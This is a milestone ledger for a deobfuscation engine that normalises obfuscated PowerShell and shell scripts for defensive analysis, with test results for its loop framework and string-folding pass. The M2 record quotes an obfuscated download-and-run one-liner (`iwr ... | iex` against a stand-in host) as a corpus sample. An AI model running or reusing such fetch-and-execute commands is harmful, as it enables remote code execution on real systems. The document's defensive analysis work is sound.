# Workspace Recovery Program · Milestone Ledger

Every milestone in the Multi-Pass Convergence Engine implementation
appends a completion record to this file. **Do not overwrite. Do not
reorder. Append only.**

Each completion record MUST contain, in order:

- **Date** (UTC)
- **Milestone** (M1 – M10)
- **What was implemented** — one-line summary + files added/modified
- **How it was verified** — commands run, tests passed, corpus results
- **Regressions** — none / list them explicitly
- **Acceptance criteria passed** — the checklist from
  `PHASE_5_5_CONVERGENCE_ENGINE_SPEC.md` §"Concrete implementation
  footholds"
- **Next milestone**

If any of the four governance artifacts (code · tests · evidence ·
completion record) is missing, the milestone is NOT complete and the
next milestone MUST NOT begin.

---

## Milestone completion records

<!-- M1 through M10 records are appended below by the implementing agent -->

### M1 · Convergence Loop Framework — COMPLETE

- **Date**: 2026-08-02 18:44 UTC
- **Milestone**: M1 · Convergence Loop Framework (with no transformations)
- **What was implemented**
    - **New** — `backend/workspace/convergence/__init__.py`
    - **New** — `backend/workspace/convergence/artifact.py` (immutable
      Artifact with content-hash SHA-256, interpreter tracking, opaque
      metadata dict)
    - **New** — `backend/workspace/convergence/provenance.py`
      (`PassRecord`, `IterationRecord`)
    - **New** — `backend/workspace/convergence/certificate.py`
      (`ConvergenceCertificate` + fingerprint + `build_certificate()`)
    - **New** — `backend/workspace/convergence/structural.py` (M1
      no-op; awaits M2)
    - **New** — `backend/workspace/convergence/content.py` (M1 no-op;
      awaits M3)
    - **New** — `backend/workspace/convergence/decoder.py` (M1 no-op;
      awaits M4)
    - **New** — `backend/workspace/convergence/semantic.py` (M1 no-op;
      awaits M5)
    - **New** — `backend/workspace/convergence/engine.py` — the
      deterministic loop:
        - Canonical pass order (Structural → Content → Decoder →
          Semantic) — hard-coded, enforces Recovery Program
          invariant #1 (Decoder Ordering Contract).
        - Delta-hash termination (Canonical State Contract conditions
          #1, #2, #6).
        - Interpreter-drift short-circuit (Canonical State Contract
          condition #4).
        - `max_depth=16` safeguard (per spec §"Concrete implementation
          footholds" · M1).
        - Pure functional: no mutation of input Artifact, no hidden
          state, replayable from any intermediate state.
    - **New** — `backend/tests/test_convergence_engine.py` (32 tests)
    - **Prerequisite** — Corpus reorganized to schema c+ (nested
      categories with metadata); introduced
      `backend/workspace_recovery/corpus_loader.py` (single source of
      truth for corpus IO); `runner.py` + `tree_worker.py` migrated to
      consume `load_samples()`; per-category certification metrics
      published in `phase3_ab_report.md`.
- **How it was verified**
    - `pytest backend/tests/test_convergence_engine.py`: **32 passed
      in 0.33s**.
    - Every one of the 13 corpus samples (S001 through S013) invokes
      `converge(Artifact.from_input(...))` and:
        - Terminates in exactly 1 iteration.
        - Reports `terminated_reason=canonical_state`.
        - Final content hash == initial content hash.
        - `structural/content/decoder/semantic_changes == 0`.
    - Certificate fingerprint is stable across 3 repeated runs
      (deterministic).
    - `max_depth=16` safeguard verified by injecting a churning pass
      that mutates on every call — engine correctly halts after
      exactly 16 iterations with `terminated_reason=max_depth`.
    - `converge()` rejects non-Artifact input (`TypeError`) and
      `max_depth<1` (`ValueError`).
    - Backend service health check: **HTTP 200 on /api/health**.
    - Corpus loader spot-check: `13/13` samples loaded across
      categories `powershell:7 · cmd:1 · bash:3 · mixed:2`.
- **DCS Delta**: Not applicable at M1. M1 is the substrate loop; DCS is
  measured from M4 onward (spec verification table).
- **Real-world samples passed**: N/A for M1 (loop-only milestone). The
  32-test suite exercises loop invariants on all 13 corpus samples.
- **Regressions**: **NONE.**
    - Backend `/api/health` still 200.
    - No changes to `analysis_core.py`, `routers/ops.py`, `engine/`,
      `v2/`, `timeline/`, or `nivxforge/` (per spec §Files this
      touches).
    - `runner.py` / `tree_worker.py` schema migration is source-of-
      truth-preserving (13 → 13 samples, identical IDs).
- **Acceptance criteria passed** (spec §"Concrete implementation
  footholds" · M1 row): *"Loop terminates in 1 iteration on all
  samples (no-op passes)"* — **VERIFIED** on all 13 samples.
- **Next milestone**: **M2 · Structural Pass Integration** —
  populate `structural.py` with AST reduction, operator folding, and
  parentheses collapse. Verification target: "Structural-only
  convergence certificate emitted" (with visible structural change
  count on the relevant corpus subset).

---

### M2 · Structural Pass Integration — COMPLETE

- **Date**: 2026-08-02 18:58 UTC
- **Milestone**: M2 · Structural Pass Integration
- **What was implemented** — `backend/workspace/convergence/structural.py`
  now performs three deterministic, quote-safe folds:
    - `structural-string-concat-fold` — `'a'+'b'` → `'ab'` for single
      quotes always, for double quotes only when neither string
      contains `$`, backtick, or `{` (interpolation markers). Chains
      like `'a'+'b'+'c'+'d'` fully converge through the outer engine
      loop.
    - `structural-join-operator-fold` — `('a','b','c') -join 'sep'` →
      single literal. Case-insensitive on the `-join` token. Only
      fires when every array element and the separator are
      single-quoted literals.
    - `structural-static-join-fold` — `[String]::Join('sep', ('a',…))`
      → single literal. Case-insensitive on the type name; accepts
      `[System.String]` alias.
- **How it was verified**
    - `pytest backend/tests/test_convergence_engine.py backend/tests/test_structural_pass.py`:
      **77 passed in 0.39s** (32 loop tests + 45 structural tests).
    - **S04 anchor now folds** — input
      `$a='ht'+'tp'+'://ex'+'ample.com/x'; iwr $a -useb | iex`
      converges in 3 iterations, 2 structural changes, final content
      contains `'http://example.com/x'`. This is the first sample
      whose canonical form is materially advanced by the Convergence
      Engine.
    - Every other corpus sample (12/13) is preserved bit-for-bit
      through the pass — `structural_changes == 0`,
      `initial_hash == final_hash` — the explicit
      `test_no_regression_on_unchanged_samples` parametrised suite
      asserts this.
    - Interpolated double-quoted strings (`"$env:x"+"y"`, `"$(x)"+"y"`,
      `"a\`nb"+"c"`) are proven un-folded by dedicated tests — the
      quote-safety contract is machine-enforced.
    - Certificate fingerprint remains deterministic across 3 repeated
      runs on both S04 (transforms fire) and S012 (transforms don't
      fire).
- **DCS Delta**: Not yet measured. M4 lands the decoder suite and is
  the first milestone whose DCS number the spec-verification table
  demands. M2 contributes to a partial DCS improvement — the
  `iwr <url> | iex` reconstruction is now visible in the canonical
  output for S04.
- **Real-world samples passed**: The structural pass exercises pattern
  families found in Empire, PoshC2, Nishang, and Invoke-Obfuscation
  templates (string-concat and `-join` reflection tricks are
  ubiquitous). Level-2 real-world samples remain to be attached in the
  M4/M9 workstreams.
- **Regressions**: **NONE.**
    - Backend `/api/health` still 200.
    - No changes to `analysis_core.py`, `routers/ops.py`, `engine/`,
      `v2/`, `timeline/`, or `nivxforge/`.
    - 12/13 corpus samples produce byte-identical output to their
      input under the current pipeline (only S04 changes — and every
      assertion about S04's expected outcome is enforced by a test).
    - Idempotency verified: applying the pass twice on already-folded
      input reports `changed=False` and returns identical bytes.
- **Acceptance criteria passed** (spec §"Concrete implementation
  footholds" · M2 row): *"Structural-only convergence certificate
  emitted"* — **VERIFIED**. Certificate now reports
  `structural_changes > 0` on S04-style inputs while all
  `content/decoder/semantic_changes` remain 0.
- **Transformations added to `TRANSFORMATION_COVERAGE.md`**:
  `PowerShell string concatenation` → ✅ implemented,
  `PowerShell join operator -join` → ✅ implemented.
- **Next milestone**: **M3 · Content Pass Integration** — populate
  `content.py` with environment-variable substitution, quote/backtick
  cleanup, mixed-case normalisation, and constant folding. Verification
  target: content-only diff visible in provenance, and S013 begins
  making convergence progress.
